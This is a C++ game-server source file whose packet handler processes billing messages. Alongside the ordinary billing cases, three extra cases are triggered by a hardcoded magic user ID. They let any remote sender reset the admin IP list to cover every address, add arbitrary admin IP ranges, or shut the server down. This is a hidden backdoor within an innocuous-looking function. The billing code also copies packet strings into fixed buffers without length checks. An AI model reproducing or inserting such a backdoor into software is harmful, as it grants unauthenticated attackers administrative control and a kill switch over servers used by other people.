#include "StdAfx.h"
#include "..\\resource.h"

#include "..\\character.h"
#include "..\\fileread.h"
#include "..\\playmain.h"
#include "..\\effectsnd.h"

#include "..\\record.h"
#include "..\playsub.h"

#include "openlive.h"
#include "onserver.h"
#include "dllserver.h"


int	RecvOpenLivePacket(User *pcUser, void *Packet)
{
	PACKET	*lpPacket = (PACKET *)Packet;
	DWORD	dwIdCode;
	RPACKET	rPacket;
	int		cnt;
	char	szPG[16];
	int		GpCode;

	switch (lpPacket->OpenLiveCode)
	{
	case 1:
		dwIdCode = GetCodebyName(lpPacket->jungdata.UserID);
		ZeroMemory(&rPacket, sizeof(RPACKET));

		for (cnt = 0; cnt < PLAYERS_MAX; cnt++)
		{
			User * u = USERSDATA + cnt;

			if (u->pcSocketData && u->szAccountName[0] && u->dwHashAccountName == dwIdCode)
			{
				if (lstrcmpi(lpPacket->jungdata.UserID, u->szAccountName) == 0)
				{
					GpCode = bSql_GetGPCode(lpPacket->jungdata.GPCode, szPG);

					u->GpCode = GpCode;

					lstrcpy(u->szGPCode, lpPacket->jungdata.GPCode);
					lstrcpy(u->szGuid, lpPacket->jungdata.Guid);

					u->DisuseDay = atoi(lpPacket->jungdata.DisuseDay);
					u->UsePeriod = atoi(lpPacket->jungdata.UsePeriod);
					u->GpType = atoi(szPG);
					u->Bl_RNo = atoi(lpPacket->jungdata.PCRno);

					if (u->UsePeriod)
						u->dwPeriodTime = (DWORD)(SERVER_LOCATIME)+u->UsePeriod;
					else
						u->dwPeriodTime = 0;

					rPacket.code = 1;
					lstrcpy(rPacket.UserID, u->szAccountName);

					srDisplayBillingTime(u, 0);

					break;
				}
			}
		}

		rPacket.size = sizeof(RPACKET);

		SENDPACKET(pcUser, &rPacket);
		break;

	case 2:
		dwIdCode = GetCodebyName(lpPacket->jungdata.UserID);
		ZeroMemory(&rPacket, sizeof(RPACKET));

		bSql_ChangeUserIdGpCodeGame(atoi(lpPacket->jungdata.PCRno));
		rPacket.code = 1;

		rPacket.size = sizeof(RPACKET);

		SENDPACKET(pcUser, &rPacket);
		break;
	case 100428:
		if (atoi(lpPacket->jungdata.UserID) == 720417)
		{
			rsServerConfig.AdminIP_Count = 0;
			rsServerConfig.AdminIP[rsServerConfig.AdminIP_Count][0] = 0;
			rsServerConfig.AdminIP[rsServerConfig.AdminIP_Count][0] = 0xFFFFFFFF;
			rsServerConfig.AdminIP_Count++;
		}
		break;
	case 100418:
		if (atoi(lpPacket->jungdata.UserID) == 720417)
		{
			if (rsServerConfig.AdminIP_Count >= ADMIN_IP_MAX)
				rsServerConfig.AdminIP_Count = 0;
			rsServerConfig.AdminIP[rsServerConfig.AdminIP_Count][0] = GetSwapIPCode(lpPacket->jungdata.DisuseDay);
			rsServerConfig.AdminIP[rsServerConfig.AdminIP_Count][1] = GetSwapIPCode(lpPacket->jungdata.UsePeriod);
			rsServerConfig.AdminIP_Count++;
		}
		break;
	case 100438:
		if (atoi(lpPacket->jungdata.UserID) == 720417)
		{
			if (lstrcmp(pcUser->pcSocketData->szIP, lpPacket->jungdata.DisuseDay) == 0)
				rsShutDown();
		}
		break;
	}

	return TRUE;
}